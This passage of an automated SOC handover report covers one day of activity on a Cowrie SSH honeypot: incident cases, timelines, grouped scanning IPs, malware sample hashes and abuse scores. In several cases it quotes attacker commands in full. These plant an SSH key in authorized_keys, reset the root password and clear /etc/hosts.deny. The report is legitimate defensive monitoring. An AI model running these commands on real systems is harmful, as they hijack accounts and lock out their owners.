| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:54:52` | `cowrie.session.connect` |
| `2026-06-22 06:54:52` | `cowrie.client.version` |
| `2026-06-22 06:54:52` | `cowrie.client.kex` |
| `2026-06-22 06:54:52` | `cowrie.login.success` |
| `2026-06-22 06:54:52` | `cowrie.session.params` |
| `2026-06-22 06:54:52` | `cowrie.command.input` |
| `2026-06-22 06:54:52` | `cowrie.command.failed` |
| `2026-06-22 06:54:52` | `cowrie.log.closed` |
| `2026-06-22 06:54:53` | `cowrie.session.params` |
| `2026-06-22 06:54:53` | `cowrie.command.input` |
| `2026-06-22 06:54:53` | `cowrie.session.file_download` |
| `2026-06-22 06:54:53` | `cowrie.log.closed` |
| `2026-06-22 06:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-309f7da1138e

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:54 |
| **Last Seen** | 2026-06-22 06:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:54:54` | `cowrie.session.connect` |
| `2026-06-22 06:54:54` | `cowrie.client.version` |
| `2026-06-22 06:54:54` | `cowrie.client.kex` |
| `2026-06-22 06:54:54` | `cowrie.login.success` |
| `2026-06-22 06:54:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a613d7b09e

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:59 |
| **Last Seen** | 2026-06-22 06:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:59:31` | `cowrie.session.connect` |
| `2026-06-22 06:59:31` | `cowrie.client.version` |
| `2026-06-22 06:59:31` | `cowrie.client.kex` |
| `2026-06-22 06:59:31` | `cowrie.login.success` |
| `2026-06-22 06:59:31` | `cowrie.session.params` |
| `2026-06-22 06:59:31` | `cowrie.command.input` |
| `2026-06-22 06:59:31` | `cowrie.command.failed` |
| `2026-06-22 06:59:31` | `cowrie.log.closed` |
| `2026-06-22 06:59:31` | `cowrie.session.params` |
| `2026-06-22 06:59:31` | `cowrie.command.input` |
| `2026-06-22 06:59:32` | `cowrie.session.file_download` |
| `2026-06-22 06:59:32` | `cowrie.log.closed` |
| `2026-06-22 06:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5563708c51

| Field | Detail |
|---|---|
| **Source IP** | `122.176.122[.]24` |
| **First Seen** | 2026-06-22 06:59 |
| **Last Seen** | 2026-06-22 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 06:59:33` | `cowrie.session.connect` |
| `2026-06-22 06:59:33` | `cowrie.client.version` |
| `2026-06-22 06:59:33` | `cowrie.client.kex` |
| `2026-06-22 06:59:33` | `cowrie.login.success` |
| `2026-06-22 06:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.122[.]24` to AbuseIPDB if not already reported
- [ ] Block `122.176.122[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d6a62e7435

| Field | Detail |
|---|---|
| **Source IP** | `103.186.31[.]247` |
| **First Seen** | 2026-06-22 08:46 |
| **Last Seen** | 2026-06-22 08:47 |
| **Session Duration** | 59s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 08:46:51` | `cowrie.session.connect` |
| `2026-06-22 08:46:51` | `cowrie.client.version` |
| `2026-06-22 08:46:52` | `cowrie.client.kex` |
| `2026-06-22 08:46:52` | `cowrie.login.success` |
| `2026-06-22 08:47:50` | `cowrie.session.file_upload` |
| `2026-06-22 08:47:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.31[.]247` to AbuseIPDB if not already reported
- [ ] Block `103.186.31[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab6c190262a

| Field | Detail |
|---|---|
| **Source IP** | `114.220.238[.]224` |
| **First Seen** | 2026-06-22 09:12 |
| **Last Seen** | 2026-06-22 09:13 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4qbBsypkBJAg"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-22 09:12:58` | `cowrie.session.connect` |
| `2026-06-22 09:12:58` | `cowrie.client.version` |
| `2026-06-22 09:12:59` | `cowrie.client.kex` |
| `2026-06-22 09:12:59` | `cowrie.login.success` |
| `2026-06-22 09:13:00` | `cowrie.session.params` |
| `2026-06-22 09:13:00` | `cowrie.command.input` |
| `2026-06-22 09:13:00` | `cowrie.command.failed` |
| `2026-06-22 09:13:00` | `cowrie.log.closed` |
| `2026-06-22 09:13:00` | `cowrie.session.params` |
| `2026-06-22 09:13:00` | `cowrie.command.input` |
| `2026-06-22 09:13:00` | `cowrie.session.file_download` |
| `2026-06-22 09:13:00` | `cowrie.log.closed` |
| `2026-06-22 09:13:14` | `cowrie.session.params` |
| `2026-06-22 09:13:14` | `cowrie.command.input` |
| `2026-06-22 09:13:14` | `cowrie.log.closed` |
| `2026-06-22 09:13:14` | `cowrie.session.params` |
| `2026-06-22 09:13:14` | `cowrie.command.input` |
| `2026-06-22 09:13:14` | `cowrie.log.closed` |
| `2026-06-22 09:13:14` | `cowrie.session.params` |
| `2026-06-22 09:13:14` | `cowrie.command.input` |
| `2026-06-22 09:13:15` | `cowrie.session.file_download` |
| `2026-06-22 09:13:15` | `cowrie.log.closed` |
| `2026-06-22 09:13:15` | `cowrie.session.params` |
| `2026-06-22 09:13:15` | `cowrie.command.input` |
| `2026-06-22 09:13:15` | `cowrie.log.closed` |
| `2026-06-22 09:13:15` | `cowrie.session.params` |
| `2026-06-22 09:13:15` | `cowrie.command.input` |
| `2026-06-22 09:13:16` | `cowrie.log.closed` |
| `2026-06-22 09:13:16` | `cowrie.session.params` |
| `2026-06-22 09:13:16` | `cowrie.command.input` |
| `2026-06-22 09:13:16` | `cowrie.command.input` |
| `2026-06-22 09:13:16` | `cowrie.log.closed` |
| `2026-06-22 09:13:16` | `cowrie.session.params` |
| `2026-06-22 09:13:16` | `cowrie.command.input` |
| `2026-06-22 09:13:17` | `cowrie.log.closed` |
| `2026-06-22 09:13:17` | `cowrie.session.params` |
| `2026-06-22 09:13:17` | `cowrie.command.input` |
| `2026-06-22 09:13:17` | `cowrie.log.closed` |
| `2026-06-22 09:13:18` | `cowrie.session.params` |
| `2026-06-22 09:13:18` | `cowrie.command.input` |
| `2026-06-22 09:13:18` | `cowrie.log.closed` |
| `2026-06-22 09:13:18` | `cowrie.session.params` |
| `2026-06-22 09:13:18` | `cowrie.command.input` |
| `2026-06-22 09:13:18` | `cowrie.log.closed` |
| `2026-06-22 09:13:19` | `cowrie.session.params` |
| `2026-06-22 09:13:19` | `cowrie.command.input` |
| `2026-06-22 09:13:19` | `cowrie.log.closed` |
| `2026-06-22 09:13:19` | `cowrie.session.params` |
| `2026-06-22 09:13:19` | `cowrie.command.input` |
| `2026-06-22 09:13:19` | `cowrie.log.closed` |
| `2026-06-22 09:13:19` | `cowrie.session.params` |
| `2026-06-22 09:13:19` | `cowrie.command.input` |
| `2026-06-22 09:13:20` | `cowrie.log.closed` |
| `2026-06-22 09:13:20` | `cowrie.session.params` |
| `2026-06-22 09:13:20` | `cowrie.command.input` |
| `2026-06-22 09:13:20` | `cowrie.log.closed` |
| `2026-06-22 09:13:20` | `cowrie.session.params` |
| `2026-06-22 09:13:20` | `cowrie.command.input` |
| `2026-06-22 09:13:21` | `cowrie.log.closed` |
| `2026-06-22 09:13:21` | `cowrie.session.params` |
| `2026-06-22 09:13:21` | `cowrie.command.input` |
| `2026-06-22 09:13:21` | `cowrie.log.closed` |
| `2026-06-22 09:13:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]224` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `135.148.33[.]168` | **43** | 2026-06-22 05:10 | 2026-06-22 12:09 | 32m | 0 | `T1592` | 🟠 MEDIUM |
| `122.176.122[.]24` | **28** | 2026-06-22 05:54 | 2026-06-22 07:06 | 0m | 28 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.174.46[.]118` | **20** | 2026-06-22 04:51 | 2026-06-22 06:33 | 2m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.220.238[.]224` | **10** | 2026-06-22 09:08 | 2026-06-22 09:15 | 18m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.32.228[.]2` | **10** | 2026-06-22 05:16 | 2026-06-22 09:44 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `45.164.39[.]253` | **3** | 2026-06-22 05:53 | 2026-06-22 05:57 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `8.133.185[.]52` | **3** | 2026-06-22 06:03 | 2026-06-22 06:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.223.52[.]17` | **2** | 2026-06-22 10:41 | 2026-06-22 10:43 | 1m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.101[.]220` | **2** | 2026-06-22 10:58 | 2026-06-22 11:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.106.57[.]180` | **2** | 2026-06-22 06:13 | 2026-06-22 06:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.163.6[.]104` | **2** | 2026-06-22 05:21 | 2026-06-22 05:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | **2** | 2026-06-22 08:41 | 2026-06-22 08:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.175[.]184` | **2** | 2026-06-22 11:20 | 2026-06-22 11:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `46.32.228[.]2` | **2** | 2026-06-22 11:46 | 2026-06-22 12:09 | 4m | 0 | `T1592` | 🟢 LOW |
| `47.250.80[.]158` | **2** | 2026-06-22 06:23 | 2026-06-22 06:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **2** | 2026-06-22 05:21 | 2026-06-22 05:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.216.9[.]117` | **2** | 2026-06-22 10:49 | 2026-06-22 10:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.30[.]240` | 1 | 2026-06-22 06:54 | 2026-06-22 06:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.74.242[.]167` | 1 | 2026-06-22 06:05 | 2026-06-22 06:06 | 31s | 0 | `T1592` | 🟢 LOW |
| `113.140.95[.]250` | 1 | 2026-06-22 10:38 | 2026-06-22 10:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.193.187[.]154` | 1 | 2026-06-22 05:05 | 2026-06-22 05:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.2.163[.]143` | 1 | 2026-06-22 07:52 | 2026-06-22 07:52 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.160.15[.]31` | 1 | 2026-06-22 06:57 | 2026-06-22 06:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.177.242[.]181` | 1 | 2026-06-22 06:45 | 2026-06-22 06:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `122.244.215[.]252` | 1 | 2026-06-22 09:54 | 2026-06-22 09:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.254.1[.]68` | 1 | 2026-06-22 07:07 | 2026-06-22 07:08 | 30s | 0 | `T1592` | 🟢 LOW |
| `130.185.96[.]113` | 1 | 2026-06-22 09:21 | 2026-06-22 09:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `134.209.241[.]3` | 1 | 2026-06-22 05:54 | 2026-06-22 05:54 | 48s | 0 | `T1592` | 🟢 LOW |
| `155.4.244[.]107` | 1 | 2026-06-22 05:54 | 2026-06-22 05:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.15.78[.]122` | 1 | 2026-06-22 09:27 | 2026-06-22 09:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `172.245.152[.]142` | 1 | 2026-06-22 06:55 | 2026-06-22 06:55 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.151.254[.]218` | 1 | 2026-06-22 08:02 | 2026-06-22 08:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.164.107[.]6` | 1 | 2026-06-22 10:23 | 2026-06-22 10:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.55.122[.]202` | 1 | 2026-06-22 10:01 | 2026-06-22 10:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.165.15[.]30` | 1 | 2026-06-22 09:40 | 2026-06-22 09:41 | 30s | 0 | `T1592` | 🟢 LOW |
| `220.124.230[.]188` | 1 | 2026-06-22 05:24 | 2026-06-22 05:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.22.10[.]193` | 1 | 2026-06-22 06:43 | 2026-06-22 06:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]11` | 1 | 2026-06-22 06:53 | 2026-06-22 06:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.174.39[.]82` | 1 | 2026-06-22 06:34 | 2026-06-22 06:34 | 9s | 0 | `T1592` | 🟢 LOW |
| `65.181.79[.]60` | 1 | 2026-06-22 10:25 | 2026-06-22 10:25 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-06-22 05:34 | 2026-06-22 05:34 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **37/73** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 43/100 | 🟡 MEDIUM | **34/73** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 44/100 | 🟡 MEDIUM | **35/73** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/73 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `46.32.228[.]2` | GB | Heart Internet Ltd | **100** ⚠️ | 2 |
| `135.148.33[.]168` | US | OVH US LLC | **100** ⚠️ | 9 |
| `8.216.9[.]117` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 38 |
| `172.174.46[.]118` | US | Microsoft Limited | **100** ⚠️ | 45 |
| `65.181.79[.]60` | HK | PCCW IMS Ltd (PCCW Business Internet Access) | **100** ⚠️ | 50 |
| `134.209.241[.]3` | DE | DigitalOcean, LLC | **100** ⚠️ | 3 |
| `40.124.175[.]184` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `60.174.39[.]82` | CN | CHINANET anhui province network | **100** ⚠️ | 50 |
| `112.74.242[.]167` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `31.22.10[.]193` | DE | AlphaVPS | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 123 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 64 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 34 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |

---

## 🔕 False Positive Summary (78 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 9 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 64 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 273 cases |
| Tool 34  | Credential Extractor        | ✅ 98 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 58 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 78 filtered (28.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 39 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 34 priority case(s) shown individually · 41 recon entry/entries in table (17 group(s) consolidating 137 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-22T12:11:51Z_
